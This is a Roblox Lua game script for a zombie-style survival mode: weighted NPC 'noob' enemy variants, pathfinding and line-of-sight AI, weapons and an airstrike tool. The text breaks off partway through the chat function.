-- NOOB SURVIVAL SCRIPT - Left 4 Dead Style (ADVANCED AI)
-- No setup required, just run this script!

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local InsertService = game:GetService("InsertService")
local TweenService = game:GetService("TweenService")
local PathfindingService = game:GetService("PathfindingService")
local Chat = game:GetService("Chat")

-- Configuration
local CONFIG = {
    NOOB_MODEL_ID = 4446576906,
    MINECRAFT_ZOMBIE_ID = 8427807358,
    MINECRAFT_SLIME_ID = 8418106463,
    EVIL_NOOB_ID = 128304350767292,
    INTRO_SOUND_ID = 119324582891677,
    SPAWN_INTERVAL = 2,
    MAX_NOOBS = 60,
    SPAWN_DISTANCE = 100,
    CHAT_INTERVAL = 5,
    VISION_RANGE = 100,
    VISION_ANGLE = 120,
    HEARING_RANGE = 50,
    PATH_UPDATE_INTERVAL = 0.5,
    ACCESSORY_CATALOG_IDS = {
        607702162, 4819740796, 11884330, 1374269, 16630147, 5063577687, 12051367663,
        11377306, 31101391, 6833027903, 15636276550, 13832869779, 48474313, 11962853991
    },
    WEAPON_ASSET_IDS = {
        4880346175, -- Sword
        5638142743, -- Gun
        92142950,    -- Rocket Launcher
        5640579210, -- Classic Sword
        4506945409  -- Blaster
    }
}

-- Noob chat messages (begging for robux)
local NOOB_MESSAGES = {
    "pls donate robux",
    "CAN I HAVE ROBUX PLS",
    "free robux anyone???",
    "im poor give me robux",
    "ROBUX PLZ IM BEGGING",
    "donate robux to me",
    "i need robux help",
    "GIVE ME ROBUX NOW",
    "robux pls im desperate",
    "anyone have free robux?",
    "PLZ DONATE I NEED ROBUX",
    "help me get robux pls",
    "ROBUX ROBUX ROBUX!!!",
    "i want robux give me some"
}

-- Variant definitions (L4D inspired + custom)
local VARIANTS = {
    -- Common variants
    {
        name = "Regular Noob",
        health = 100,
        speed = 16,
        damage = 10,
        weight = 40,
        color = Color3.fromRGB(255, 255, 0),
        aiType = "aggressive"
    },
    {
        name = "Bacon Hair",
        health = 90,
        speed = 17,
        damage = 12,
        weight = 20,
        color = Color3.fromRGB(150, 75, 0),
        aiType = "aggressive"
    },
    {
        name = "Acorn Hair",
        health = 85,
        speed = 18,
        damage = 11,
        weight = 18,
        color = Color3.fromRGB(139, 69, 19),
        aiType = "aggressive"
    },
    
    -- L4D1/L4D2 Special Infected (Noobified)
    {
        name = "Noob Hunter",
        health = 250,
        speed = 22,
        damage = 20,
        weight = 8,
        color = Color3.fromRGB(50, 50, 50),
        special = "hunter",
        aiType = "stalker"
    },
    {
        name = "Noob Smoker",
        health = 250,
        speed = 14,
        damage = 15,
        weight = 7,
        color = Color3.fromRGB(150, 150, 150),
        special = "smoker",
        aiType = "ranged"
    },
    {
        name = "Noob Boomer",
        health = 200,
        speed = 10,
        damage = 5,
        weight = 6,
        color = Color3.fromRGB(200, 150, 100),
        special = "boomer",
        aiType = "kamikaze"
    },
    {
        name = "Noob Tank",
        health = 1500,
        speed = 12,
        damage = 80,
        weight = 2,
        color = Color3.fromRGB(100, 100, 100),
        special = "tank",
        aiType = "boss"
    },
    {
        name = "Noob Witch",
        health = 800,
        speed = 25,
        damage = 100,
        weight = 1,
        color = Color3.fromRGB(255, 200, 220),
        special = "witch",
        aiType = "passive_aggressive"
    },
    {
        name = "Noob Charger",
        health = 600,
        speed = 24,
        damage = 40,
        weight = 5,
        color = Color3.fromRGB(150, 100, 80),
        special = "charger",
        aiType = "rusher"
    },
    {
        name = "Noob Spitter",
        health = 250,
        speed = 14,
        damage = 25,
        weight = 6,
        color = Color3.fromRGB(100, 200, 100),
        special = "spitter",
        aiType = "ranged"
    },
    {
        name = "Noob Jockey",
        health = 300,
        speed = 20,
        damage = 15,
        weight = 6,
        color = Color3.fromRGB(150, 150, 200),
        special = "jockey",
        aiType = "ambusher"
    },
    
    -- Original custom variants
    {
        name = "Noob 096",
        health = 500,
        speed = 35,
        damage = 50,
        weight = 5,
        color = Color3.fromRGB(255, 255, 255),
        special = "screamer",
        aiType = "enraged"
    },
    {
        name = "Speedy Noob",
        health = 80,
        speed = 28,
        damage = 15,
        weight = 15,
        color = Color3.fromRGB(0, 255, 255),
        aiType = "aggressive"
    },
    {
        name = "Driver Noob",
        health = 150,
        speed = 16,
        damage = 40,
        weight = 8,
        color = Color3.fromRGB(255, 128, 0),
        special = "driver",
        aiType = "vehicle"
    },
    {
        name = "Headless Noob Horsemen",
        health = 300,
        speed = 20,
        damage = 30,
        weight = 6,
        color = Color3.fromRGB(64, 64, 64),
        special = "headless",
        aiType = "aggressive"
    },
    {
        name = "Ghost Noob Rider",
        health = 200,
        speed = 18,
        damage = 25,
        weight = 7,
        color = Color3.fromRGB(200, 200, 255),
        special = "ghost_rider",
        aiType = "stalker"
    },
    {
        name = "Ghost Noob",
        health = 120,
        speed = 14,
        damage = 20,
        weight = 10,
        color = Color3.fromRGB(220, 220, 255),
        special = "ghost",
        aiType = "stalker"
    },
    {
        name = "Classic Zombie",
        health = 150,
        speed = 12,
        damage = 25,
        weight = 12,
        color = Color3.fromRGB(100, 150, 100),
        special = "classic",
        aiType = "aggressive"
    },
    {
        name = "Buff Noob",
        health = 400,
        speed = 10,
        damage = 45,
        weight = 4,
        color = Color3.fromRGB(255, 0, 0),
        special = "buff",
        aiType = "aggressive"
    },
    {
        name = "Thrower Noob",
        health = 130,
        speed = 15,
        damage = 20,
        weight = 8,
        color = Color3.fromRGB(128, 0, 255),
        special = "thrower",
        aiType = "ranged"
    },
    {
        name = "Flamethrower Noob",
        health = 180,
        speed = 14,
        damage = 35,
        weight = 6,
        color = Color3.fromRGB(255, 69, 0),
        special = "flamethrower",
        aiType = "ranged"
    },
    {
        name = "Minecraft Zombie",
        health = 200,
        speed = 13,
        damage = 22,
        weight = 9,
        special = "minecraft_zombie",
        aiType = "aggressive"
    },
    {
        name = "Minecraft Skeleton",
        health = 160,
        speed = 15,
        damage = 18,
        weight = 7,
        color = Color3.fromRGB(255, 255, 255),
        special = "skeleton",
        aiType = "ranged"
    },
    {
        name = "Minecraft Slime",
        health = 250,
        speed = 8,
        damage = 15,
        weight = 5,
        special = "slime",
        aiType = "aggressive"
    },
    {
        name = "King Noob",
        health = 800,
        speed = 12,
        damage = 60,
        weight = 2,
        color = Color3.fromRGB(255, 215, 0),
        special = "king",
        aiType = "boss"
    },
    {
        name = "Flying Noob",
        health = 110,
        speed = 20,
        damage = 18,
        weight = 10,
        color = Color3.fromRGB(100, 200, 255),
        special = "flying",
        aiType = "aerial"
    },
    {
        name = "Noob Medic",
        health = 150,
        speed = 16,
        damage = 8,
        weight = 5,
        color = Color3.fromRGB(255, 100, 100),
        special = "medic",
        aiType = "support"
    },
    {
        name = "Kamikaze Noob",
        health = 80,
        speed = 20,
        damage = 100,
        weight = 8,
        color = Color3.fromRGB(255, 165, 0),
        special = "kamikaze",
        aiType = "kamikaze"
    },
    {
        name = "Evil Noob",
        health = 600,
        speed = 18,
        damage = 150,
        weight = 3,
        color = Color3.fromRGB(139, 0, 0),
        special = "evil",
        aiType = "boss"
    },
    {
        name = "Oppenheimer Noob",
        health = 400,
        speed = 14,
        damage = 200,
        weight = 2,
        color = Color3.fromRGB(255, 140, 0),
        special = "oppenheimer",
        aiType = "ranged"
    }
}

-- Storage
local noobs = {}
local baseNoobModel = nil
local minecraftZombieModel = nil
local minecraftSlimeModel = nil
local evilNoobModel = nil
local airstrikeModel = nil
local spawnLocations = {}
local paths = {}
local weaponStorage = nil
local availableWeapons = {}
local introSound = nil
local lastSpawnTime = 0

-- Scan existing workspace for spawn locations and objects
local function scanEnvironment()
    print("Scanning existing workspace...")
    
    -- Create weapon storage in Lighting and ReplicatedStorage
    weaponStorage = Instance.new("Folder")
    weaponStorage.Name = "WeaponStorage"
    weaponStorage.Parent = game:GetService("Lighting")
    
    local weaponStorageRS = Instance.new("Folder")
    weaponStorageRS.Name = "WeaponStorage"
    weaponStorageRS.Parent = game:GetService("ReplicatedStorage")
    
    -- Create intro sound
    introSound = Instance.new("Sound")
    introSound.Name = "NoobSurvivalIntro"
    introSound.SoundId = "rbxassetid://" .. CONFIG.INTRO_SOUND_ID
    introSound.Volume = 0.7
    introSound.Parent = workspace
    
    print("Intro sound created with ID:", CONFIG.INTRO_SOUND_ID)
    
    -- Find all spawn locations in workspace
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("SpawnLocation") then
            table.insert(spawnLocations, obj.Position + Vector3.new(0, 5, 0))
            print("Found spawn location at:", obj.Position)
        end
    end
    
    -- If no spawns found, create a default spawn at origin
    if #spawnLocations == 0 then
        print("No spawn locations found, using default positions")
        for i = 1, 5 do
            local angle = (i / 5) * math.pi * 2
            local distance = 30
            table.insert(spawnLocations, Vector3.new(
                math.cos(angle) * distance,
                5,
                math.sin(angle) * distance
            ))
        end
    end
    
    print("Found " .. #spawnLocations .. " spawn locations")
end

-- Create basic weapons
local function createBasicWeapons()
    -- Create basic weapons in storage locations
    local weaponTypes = {
        {name = "Sword", damage = 25, range = 5, cooldown = 1, color = Color3.fromRGB(150, 150, 150)},
        {name = "Gun", damage = 15, range = 50, cooldown = 0.5, color = Color3.fromRGB(50, 50, 50)},
        {name = "Rocket Launcher", damage = 60, range = 100, cooldown = 3, color = Color3.fromRGB(100, 100, 100)},
        {name = "Blaster", damage = 20, range = 70, cooldown = 0.7, color = Color3.fromRGB(0, 100, 255)}
    }
    
    for _, weaponData in ipairs(weaponTypes) do
        local tool = Instance.new("Tool")
        tool.Name = weaponData.name
        tool.RequiresHandle = true
        
        local handle = Instance.new("Part")
        handle.Name = "Handle"
        handle.Size = Vector3.new(0.5, 0.5, 2)
        handle.BrickColor = BrickColor.new(weaponData.color)
        handle.Parent = tool
        
        -- Store weapon stats
        local stats = Instance.new("Configuration")
        stats.Name = "Stats"
        
        local damageValue = Instance.new("IntValue")
        damageValue.Name = "Damage"
        damageValue.Value = weaponData.damage
        damageValue.Parent = stats
        
        local rangeValue = Instance.new("IntValue")
        rangeValue.Name = "Range"
        rangeValue.Value = weaponData.range
        rangeValue.Parent = stats
        
        local cooldownValue = Instance.new("NumberValue")
        cooldownValue.Name = "Cooldown"
        cooldownValue.Value = weaponData.cooldown
        cooldownValue.Parent = stats
        
        stats.Parent = tool
        
        -- Clone to both storage locations
        tool:Clone().Parent = game:GetService("Lighting").WeaponStorage
        tool:Clone().Parent = game:GetService("ReplicatedStorage").WeaponStorage
        
        table.insert(availableWeapons, tool:Clone())
    end
    
    -- Try to load weapons from asset IDs
    for _, assetId in ipairs(CONFIG.WEAPON_ASSET_IDS) do
        pcall(function()
            local weapon = game:GetObjects("rbxassetid://" .. assetId)[1]
            if weapon and weapon:IsA("Tool") then
                weapon:Clone().Parent = game:GetService("Lighting").WeaponStorage
                weapon:Clone().Parent = game:GetService("ReplicatedStorage").WeaponStorage
                table.insert(availableWeapons, weapon:Clone())
            end
        end)
    end
    
    print("Weapons loaded: " .. #availableWeapons .. " types available")
end

-- Give weapon to noob
local function giveWeaponToNoob(noob)
    if #availableWeapons == 0 then return false end
    
    local weapon = availableWeapons[math.random(1, #availableWeapons)]:Clone()
    
    local humanoid = noob.model:FindFirstChildOfClass("Humanoid")
    if humanoid then
        weapon.Parent = noob.model
        humanoid:EquipTool(weapon)
        noob.weapon = weapon
        return true
    end
    
    return false
end

-- Find nearby weapon
local function findNearbyWeapon(position)
    local lighting = game:GetService("Lighting")
    local replicatedStorage = game:GetService("ReplicatedStorage")
    
    -- Check workspace for weapons on ground first
    for _, obj in ipairs(workspace:GetChildren()) do
        if obj:IsA("Tool") and obj:FindFirstChild("Handle") then
            local distance = (obj.Handle.Position - position).Magnitude
            if distance < 20 then
                return obj:Clone()
            end
        end
    end
    
    -- Check Lighting storage
    if lighting:FindFirstChild("WeaponStorage") then
        for _, weapon in ipairs(lighting.WeaponStorage:GetChildren()) do
            if weapon:IsA("Tool") then
                return weapon:Clone()
            end
        end
    end
    
    -- Check ReplicatedStorage
    if replicatedStorage:FindFirstChild("WeaponStorage") then
        for _, weapon in ipairs(replicatedStorage.WeaponStorage:GetChildren()) do
            if weapon:IsA("Tool") then
                return weapon:Clone()
            end
        end
    end
    
    return nil
end

-- Create Airstrike Tool
local function createAirstrikeTool()
    local tool = Instance.new("Tool")
    tool.Name = "Orbital Strike"
    tool.RequiresHandle = true
    tool.CanBeDropped = false
    
    local handle = Instance.new("Part")
    handle.Name = "Handle"
    handle.Size = Vector3.new(1, 1, 3)
    handle.BrickColor = BrickColor.new("Really red")
    handle.Material = Enum.Material.Neon
    handle.Parent = tool
    
    -- Add mesh for looks
    local mesh = Instance.new("SpecialMesh")
    mesh.MeshType = Enum.MeshType.FileMesh
    mesh.MeshId = "rbxassetid://94840081"
    mesh.Scale = Vector3.new(1.5, 1.5, 1.5)
    mesh.Parent = handle
    
    -- Activation script
    local activateScript = Instance.new("Script")
    activateScript.Name = "AirstrikeScript"
    activateScript.Source = [[
        local tool = script.Parent
        local debris = game:GetService("Debris")
        local cooldown = false
        
        tool.Activated:Connect(function()
            if cooldown then return end
            cooldown = true
            
            local character = tool.Parent
            if not character then 
                cooldown = false
                return 
            end
            
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if not humanoid then 
                cooldown = false
                return 
            end
            
            local mouse = game.Players:GetPlayerFromCharacter(character)
            local targetPos
            
            -- For NPCs, find nearest player
            if not mouse then
                local nearestPlayer = nil
                local nearestDistance = math.huge
                
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        local distance = (player.Character.HumanoidRootPart.Position - character.PrimaryPart.Position).Magnitude
                        if distance < nearestDistance then
                            nearestDistance = distance
                            nearestPlayer = player.Character
                        end
                    end
                end
                
                if nearestPlayer then
                    targetPos = nearestPlayer.HumanoidRootPart.Position
                else
                    cooldown = false
                    return
                end
            else
                targetPos = mouse:GetMouse().Hit.Position
            end
            
            -- Create warning marker
            local marker = Instance.new("Part")
            marker.Size = Vector3.new(30, 0.5, 30)
            marker.Position = targetPos + Vector3.new(0, 0.5, 0)
            marker.Anchored = true
            marker.CanCollide = false
            marker.BrickColor = BrickColor.new("Really red")
            marker.Material = Enum.Material.Neon
            marker.Transparency = 0.5
            marker.Parent = workspace
            
            -- Warning sound
            local warnSound = Instance.new("Sound")
            warnSound.SoundId = "rbxassetid://165969964"
            warnSound.Volume = 1
            warnSound.Parent = marker
            warnSound:Play()
            
            wait(2)
            
            -- Create missile
            local missile = Instance.new("Part")
            missile.Size = Vector3.new(3, 10, 3)
            missile.Position = targetPos + Vector3.new(0, 200, 0)
            missile.BrickColor = BrickColor.new("Dark stone grey")
            missile.Material = Enum.Material.Metal
            missile.Parent = workspace
            
            -- Smoke trail
            local smoke = Instance.new("Smoke")
            smoke.Size = 10
            smoke.Parent = missile
            
            local fire = Instance.new("Fire")
            fire.Size = 15
            fire.Parent = missile
            
            -- Move missile down
            local bodyVel = Instance.new("BodyVelocity")
            bodyVel.MaxForce = Vector3.new(0, math.huge, 0)
            bodyVel.Velocity = Vector3.new(0, -150, 0)
            bodyVel.Parent = missile
            
            -- Explosion on impact
            missile.Touched:Connect(function(hit)
                if hit.Parent ~= workspace and not hit:IsDescendantOf(character) then
                    -- Create massive explosion
                    local explosion = Instance.new("Explosion")
                    explosion.Position = missile.Position
                    explosion.BlastRadius = 40
                    explosion.BlastPressure = 1000000
                    explosion.DestroyJointRadiusPercent = 0.5
                    explosion.Parent = workspace
                    
                    -- Damage players in radius
                    for _, player in ipairs(game.Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            local distance = (player.Character.HumanoidRootPart.Position - explosion.Position).Magnitude
                            if distance < 40 then
                                local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                                if humanoid then
                                    humanoid:TakeDamage(200 * (1 - distance/40))
                                end
                            end
                        end
                    end
                    
                    missile:Destroy()
                    marker:Destroy()
                end
            end)
            
            debris:AddItem(missile, 5)
            debris:AddItem(marker, 5)
            
            wait(10)
            cooldown = false
        end)
    ]]
    activateScript.Parent = tool
    
    tool.Parent = game.ReplicatedStorage
    return tool
end

local function loadModels()
    print("Loading noob models...")
    
    local success, model = pcall(function()
        return game:GetObjects("rbxassetid://" .. CONFIG.NOOB_MODEL_ID)[1]
    end)
    
    if success and model then
        baseNoobModel = model
        baseNoobModel.Parent = game.ReplicatedStorage
        print("Base noob model loaded!")
    else
        print("Failed to load base noob model, creating custom one...")
        baseNoobModel = createCustomNoob()
    end
    
    success, model = pcall(function()
        return game:GetObjects("rbxassetid://" .. CONFIG.MINECRAFT_ZOMBIE_ID)[1]
    end)
    
    if success and model then
        minecraftZombieModel = model
        minecraftZombieModel.Parent = game.ReplicatedStorage
        print("Minecraft zombie loaded!")
    end
    
    success, model = pcall(function()
        return game:GetObjects("rbxassetid://" .. CONFIG.MINECRAFT_SLIME_ID)[1]
    end)
    
    if success and model then
        minecraftSlimeModel = model
        minecraftSlimeModel.Parent = game.ReplicatedStorage
        print("Minecraft slime loaded!")
    end
    
    -- Load Evil Noob
    success, model = pcall(function()
        return game:GetObjects("rbxassetid://" .. CONFIG.EVIL_NOOB_ID)[1]
    end)
    
    if success and model then
        evilNoobModel = model
        evilNoobModel.Parent = game.ReplicatedStorage
        print("Evil Noob loaded!")
    else
        print("Failed to load Evil Noob model")
    end
    
    -- Load Airstrike tool
    print("Loading Airstrike tool...")
    airstrikeModel = createAirstrikeTool()
end

function createCustomNoob()
    local noob = Instance.new("Model")
    noob.Name = "Noob"
    
    local torso = Instance.new("Part")
    torso.Name = "Torso"
    torso.Size = Vector3.new(2, 2, 1)
    torso.BrickColor = BrickColor.new("Bright yellow")
    torso.Parent = noob
    
    local head = Instance.new("Part")
    head.Name = "Head"
    head.Size = Vector3.new(2, 1, 1)
    head.BrickColor = BrickColor.new("Bright yellow")
    head.Position = torso.Position + Vector3.new(0, 1.5, 0)
    head.Parent = noob
    
    -- Add attachment point for accessories
    local hatAttachment = Instance.new("Attachment")
    hatAttachment.Name = "HatAttachment"
    hatAttachment.Position = Vector3.new(0, head.Size.Y/2, 0)
    hatAttachment.Parent = head
    
    local face = Instance.new("Decal")
    face.Texture = "rbxasset://textures/face.png"
    face.Face = Enum.NormalId.Front
    face.Parent = head
    
    local humanoid = Instance.new("Humanoid")
    humanoid.Parent = noob
    
    local neckWeld = Instance.new("Weld")
    neckWeld.Part0 = torso
    neckWeld.Part1 = head
    neckWeld.C0 = CFrame.new(0, 1.5, 0)
    neckWeld.Parent = torso
    
    noob.PrimaryPart = torso
    noob.Parent = game.ReplicatedStorage
    
    return noob
end

local function addRandomAccessories(noob)
    local numAccessories = math.random(0, 3)
    local humanoid = noob:FindFirstChildOfClass("Humanoid")
    local head = noob:FindFirstChild("Head")
    
    if not humanoid or not head then
        return
    end
    
    -- Wait a moment for character to fully load
    wait(0.1)
    
    for i = 1, numAccessories do
        local accessoryId = CONFIG.ACCESSORY_CATALOG_IDS[math.random(1, #CONFIG.ACCESSORY_CATALOG_IDS)]
        
        local success = pcall(function()
            local accessory = game:GetObjects("rbxassetid://" .. accessoryId)[1]
            if accessory and accessory:IsA("Accessory") then
                -- Clone to avoid issues with reuse
                local accessoryClone = accessory:Clone()
                
                -- Get handle and make it properly configured
                local handle = accessoryClone:FindFirstChild("Handle")
                if handle then
                    handle.CanCollide = false
                    handle.Massless = true
                    
                    -- Ensure handle has proper collision group
                    pcall(function()
                        handle.CollisionGroup = "Accessories"
                    end)
                end
                
                -- Use Humanoid's built-in method
                humanoid:AddAccessory(accessoryClone)
                
                -- Double-check weld after adding
                if handle and handle.Parent then
                    wait(0.05)
                    local weld = handle:FindFirstChild("AccessoryWeld")
                    if weld and weld:IsA("Weld") then
                        weld.Part0 = head
                        -- Lock the weld
                        weld.Parent = handle
                    end
                end
            end
        end)
        
        if not success then
            warn("Failed to add accessory:", accessoryId)
        end
    end
end

-- Advanced Vision System
local function hasLineOfSight(fromPos, toPos, ignoreModel)
    local direction = (toPos - fromPos).Unit
    local distance = (toPos - fromPos).Magnitude
    
    local ray = Ray.new(fromPos, direction * distance)
    local hit, position = workspace:FindPartOnRayWithIgnoreList(ray, {ignoreModel})
    
    if hit then
        -- Check if hit is part of target
        local targetChar = hit.Parent
        if targetChar and targetChar:FindFirstChild("Humanoid") then
            return true
        end
        return false
    end
    
    return true
end

local function canSeeTarget(noob, target)
    local rootPart = noob.model:FindFirstChild("HumanoidRootPart") or noob.model:FindFirstChild("Torso")
    if not rootPart then return false end
    
    local targetRoot = target:FindFirstChild("HumanoidRootPart")
    if not targetRoot then return false end
    
    local distance = (targetRoot.Position - rootPart.Position).Magnitude
    
    -- Check distance
    if distance > CONFIG.VISION_RANGE then
        return false
    end
    
    -- Check angle
    local toTarget = (targetRoot.Position - rootPart.Position).Unit
    local forward = rootPart.CFrame.LookVector
    local angle = math.acos(forward:Dot(toTarget))
    
    if math.deg(angle) > CONFIG.VISION_ANGLE / 2 then
        return false
    end
    
    -- Check line of sight
    return hasLineOfSight(rootPart.Position, targetRoot.Position, noob.model)
end

local function canHearTarget(noob, target)
    local rootPart = noob.model:FindFirstChild("HumanoidRootPart") or noob.model:FindFirstChild("Torso")
    if not rootPart then return false end
    
    local targetRoot = target:FindFirstChild("HumanoidRootPart")
    if not targetRoot then return false end
    
    local distance = (targetRoot.Position - rootPart.Position).Magnitude
    
    -- Hear running players
    local targetHumanoid = target:FindFirstChild("Humanoid")
    if targetHumanoid and targetHumanoid.MoveVector.Magnitude > 0 then
        return distance < CONFIG.HEARING_RANGE
    end
    
    return false
end

-- Pathfinding System
local function createPath(startPos, endPos)
    local path = PathfindingService:CreatePath({
        AgentRadius = 2,
        AgentHeight = 5,
        AgentCanJump = true,
        WaypointSpacing = 4,
        Costs = {
            Water = 20,
            Danger = math.huge
        }
    })
    
    local success, errorMsg = pcall(function()
        path:ComputeAsync(startPos, endPos)
    end)
    
    if success and path.Status == Enum.PathStatus.Success then
        return path:GetWaypoints()
    end
    
    return nil
end

local function followPath(noob, waypoints)
    if not waypoints or #waypoints == 0 then return end
    
    local humanoid = noob.humanoid
    local rootPart = noob.model:FindFirstChild("HumanoidRootPart") or noob.model:FindFirstChild("Torso")
    if not rootPart or not humanoid then return end
    
    -- Find next waypoint to move to
    local currentWaypointIndex = noob.pathIndex or 1
    
    if currentWaypointIndex > #waypoints then
        return
    end
    
    local waypoint = waypoints[currentWaypointIndex]
    local distance = (rootPart.Position - waypoint.Position).Magnitude
    
    -- If close enough to waypoint, move to next one
    if distance < 4 then
        noob.pathIndex = currentWaypointIndex + 1
        if noob.pathIndex <= #waypoints then
            waypoint = waypoints[noob.pathIndex]
        else
            return
        end
    end
    
    -- Move to current waypoint
    humanoid:MoveTo(waypoint.Position)
    
    if waypoint.Action == Enum.PathWaypointAction.Jump then
        humanoid.Jump = true
    end
end

local function chooseVariant()
    local totalWeight = 0
    for _, variant in ipairs(VARIANTS) do
        totalWeight = totalWeight + variant.weight
    end
    
    local roll = math.random() * totalWeight
    local currentWeight = 0
    
    for _, variant in ipairs(VARIANTS) do
        currentWeight = currentWeight + variant.weight
        if roll <= currentWeight then
            return variant
        end
    end
    
    return VARIANTS[1]
end

local function createNoob(position, variant)
    local noobModel
    
    if variant.special == "minecraft_zombie" and minecraftZombieModel then
        noobModel = minecraftZombieModel:Clone()
    elseif variant.special == "slime" and minecraftSlimeModel then
        noobModel = minecraftSlimeModel:Clone()
    elseif variant.special == "evil" and evilNoobModel then
        noobModel = evilNoobModel:Clone()
    else
        noobModel = baseNoobModel:Clone()
    end
    
    noobModel.Parent = workspace
    
    -- Ensure head has attachment points for accessories
    local head = noobModel:FindFirstChild("Head")
    if head and not head:FindFirstChild("HatAttachment") then
        local hatAttachment = Instance.new("Attachment")
        hatAttachment.Name = "HatAttachment"
        hatAttachment.Position = Vector3.new(0, head.Size.Y/2, 0)
        hatAttachment.Parent = head
    end
    
    local humanoid = noobModel:FindFirstChildOfClass("Humanoid")
    if not humanoid then
        humanoid = Instance.new("Humanoid")
        humanoid.Parent = noobModel
    end
    
    humanoid.MaxHealth = variant.health
    humanoid.Health = variant.health
    humanoid.WalkSpeed = variant.speed
    humanoid.DisplayName = variant.name
    
    if variant.color then
        for _, part in ipairs(noobModel:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Color = variant.color
            end
        end
    end
    
    -- Special visual modifications
    if variant.special == "headless" then
        local head = noobModel:FindFirstChild("Head")
        if head then
            head.Transparency = 1
            for _, child in ipairs(head:GetChildren()) do
                if child:IsA("Decal") then
                    child:Destroy()
                end
            end
        end
    end
    
    if variant.special == "ghost" or variant.special == "ghost_rider" then
        for _, part in ipairs(noobModel:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Transparency = 0.5
                part.Material = Enum.Material.Neon
            end
        end
    end
    
    if variant.special == "buff" or variant.special == "tank" then
        for _, part in ipairs(noobModel:GetDescendants()) do
            if part:IsA("BasePart") and part.Name ~= "Head" then
                part.Size = part.Size * 1.5
            end
        end
    end
    
    if variant.special == "flying" or variant.special == "hunter" then
        local bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.MaxForce = Vector3.new(0, 4000, 0)
        bodyVelocity.Velocity = Vector3.new(0, 0, 0)
        bodyVelocity.Parent = noobModel.PrimaryPart or noobModel:FindFirstChild("Torso")
    end
    
    if variant.special == "boomer" then
        for _, part in ipairs(noobModel:GetDescendants()) do
            if part:IsA("BasePart") and part.Name ~= "Head" then
                part.Size = part.Size * 1.3
            end
        end
    end
    
    if variant.special == "medic" then
        -- Add red cross to medic
        local head = noobModel:FindFirstChild("Head")
        if head then
            local billboard = Instance.new("BillboardGui")
            billboard.Size = UDim2.new(2, 0, 2, 0)
            billboard.Adornee = head
            billboard.AlwaysOnTop = true
            
            local cross = Instance.new("TextLabel")
            cross.Size = UDim2.new(1, 0, 1, 0)
            cross.BackgroundTransparency = 1
            cross.Text = "+"
            cross.TextColor3 = Color3.fromRGB(255, 0, 0)
            cross.TextScaled = true
            cross.Font = Enum.Font.SourceSansBold
            cross.Parent = billboard
            
            billboard.Parent = head
        end
    end
    
    if variant.special == "kamikaze" then
        -- Add bomb visual to kamikaze
        for _, part in ipairs(noobModel:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Material = Enum.Material.Neon
                
                -- Add blinking effect
                spawn(function()
                    while noobModel.Parent do
                        part.BrickColor = BrickColor.new("Bright red")
                        wait(0.3)
                        if not noobModel.Parent then break end
                        part.BrickColor = BrickColor.new("Bright orange")
                        wait(0.3)
                    end
                end)
            end
        end
    end
    
    if variant.special == "evil" then
        -- Add evil aura to Evil Noob
        for _, part in ipairs(noobModel:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Material = Enum.Material.Neon
                
                -- Add red pulsing effect
                spawn(function()
                    while noobModel.Parent do
                        part.BrickColor = BrickColor.new("Really red")
                        wait(0.5)
                        if not noobModel.Parent then break end
                        part.BrickColor = BrickColor.new("Crimson")
                        wait(0.5)
                    end
                end)
            end
        end
        
        -- Add evil particle effect
        local head = noobModel:FindFirstChild("Head")
        if head then
            local particles = Instance.new("ParticleEmitter")
            particles.Color = ColorSequence.new(Color3.fromRGB(139, 0, 0))
            particles.Size = NumberSequence.new(0.5, 1)
            particles.Texture = "rbxasset://textures/particles/smoke_main.dds"
            particles.Lifetime = NumberRange.new(1, 2)
            particles.Rate = 20
            particles.SpreadAngle = Vector2.new(180, 180)
            particles.Speed = NumberRange.new(2, 5)
            particles.Parent = head
        end
    end
    
    if variant.special == "oppenheimer" then
        -- Add nuclear glow to Oppenheimer Noob
        for _, part in ipairs(noobModel:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Material = Enum.Material.Neon
                
                -- Orange nuclear glow
                spawn(function()
                    while noobModel.Parent do
                        part.BrickColor = BrickColor.new("Deep orange")
                        wait(0.3)
                        if not noobModel.Parent then break end
                        part.BrickColor = BrickColor.new("Bright orange")
                        wait(0.3)
                    end
                end)
            end
        end
        
        -- Give the Oppenheimer noob the airstrike tool
        if airstrikeModel then
            local airstrikeClone = airstrikeModel:Clone()
            airstrikeClone.Parent = noobModel
            humanoid:EquipTool(airstrikeClone)
        end
        
        -- Add radioactive particles
        local head = noobModel:FindFirstChild("Head")
        if head then
            local particles = Instance.new("ParticleEmitter")
            particles.Color = ColorSequence.new(Color3.fromRGB(255, 140, 0))
            particles.Size = NumberSequence.new(0.8, 1.5)
            particles.Texture = "rbxasset://textures/particles/sparkles_main.dds"
            particles.Lifetime = NumberRange.new(1, 3)
            particles.Rate = 30
            particles.SpreadAngle = Vector2.new(180, 180)
            particles.Speed = NumberRange.new(3, 6)
            particles.Parent = head
        end
    end
    
    if not variant.special or (variant.special ~= "minecraft_zombie" and variant.special ~= "slime" and variant.special ~= "skeleton") then
        -- Don't add accessories yet - wait until after positioning
    end
    
    if noobModel.PrimaryPart then
        noobModel:SetPrimaryPartCFrame(CFrame.new(position + Vector3.new(0, 5, 0)))
    elseif noobModel:FindFirstChild("Torso") then
        noobModel.Torso.Position = position + Vector3.new(0, 5, 0)
    end
    
    -- NOW add accessories after model is positioned and fully in workspace
    if not variant.special or (variant.special ~= "minecraft_zombie" and variant.special ~= "slime" and variant.special ~= "skeleton" and variant.special ~= "evil") then
        spawn(function()
            wait(0.2) -- Wait for physics to settle
            addRandomAccessories(noobModel)
        end)
    end
    
    return {
        model = noobModel,
        variant = variant,
        humanoid = humanoid,
        lastChat = 0,
        lastSpecialAction = 0,
        lastPathUpdate = 0,
        target = nil,
        aiState = "idle",
        waypoints = nil,
        pathIndex = 1,
        isEnraged = false,
        alertLevel = 0,
        weapon = nil,
        lastWeaponSearch = 0
    }
end

local function makeNoobChat(noob)
    if tick() - noob.lastChat < CONFIG.CHAT_INTERVAL then
        return
    end
    
